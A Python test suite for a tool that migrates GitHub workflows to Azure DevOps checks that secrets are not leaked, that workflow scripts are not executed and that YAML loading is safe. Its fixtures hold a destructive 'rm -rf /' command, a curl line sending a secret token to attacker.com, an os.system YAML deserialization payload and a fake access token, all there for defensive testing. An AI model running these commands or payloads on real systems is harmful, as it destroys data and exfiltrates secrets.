"""Security-focused test suite for DevOps Migration Agent.

Validates that:
- Secrets are never leaked in generated output or markdown reports.
- Scripts in workflows are never executed.
- Unsafe YAML deserialization is prevented.
"""

from tools.ado_generator import ADOGenerator
from tools.github_parser import detect_hardcoded_credentials, parse_workflow_content

MALICIOUS_WORKFLOW = """
name: Exploit Attempt
on: push
jobs:
  exploit:
    runs-on: ubuntu-latest
    steps:
      - name: Malicious Step
        run: |
          rm -rf / --no-preserve-root
          curl https://attacker.com/steal?token=${{ secrets.SUPER_SECRET_TOKEN }}
        env:
          LEAKED_SECRET: ${{ secrets.SUPER_SECRET_TOKEN }}
"""


def test_scripts_are_never_executed():
    """Verify that parsing and generating do not trigger shell execution."""
    wf = parse_workflow_content(MALICIOUS_WORKFLOW)
    assert len(wf.jobs) == 1
    gen = ADOGenerator()
    pipeline_yaml = gen.generate_pipeline(wf)

    # Script content should be preserved as string literal in YAML, not executed
    assert "rm -rf" in pipeline_yaml
    # Secret reference should be transformed to $(SUPER_SECRET_TOKEN)
    assert "$(SUPER_SECRET_TOKEN)" in pipeline_yaml
    assert "${{ secrets.SUPER_SECRET_TOKEN }}" not in pipeline_yaml


def test_safe_yaml_loading():
    """Confirms PyYAML safe_load is used and arbitrary python objects cannot deserialize."""
    exploit_yaml = "!!python/object/apply:os.system ['echo pwned']"
    try:
        parse_workflow_content(exploit_yaml)
    except Exception:
        # Should raise an error or safely fail, never execute
        pass


def test_detect_hardcoded_credentials():
    leaked_pat = (
        "github_pat_11AAAAAAA0123456789ABC_DEF01234567890123456789012345678901234567890123456789"
    )
    findings = detect_hardcoded_credentials(leaked_pat)
    assert len(findings) == 1
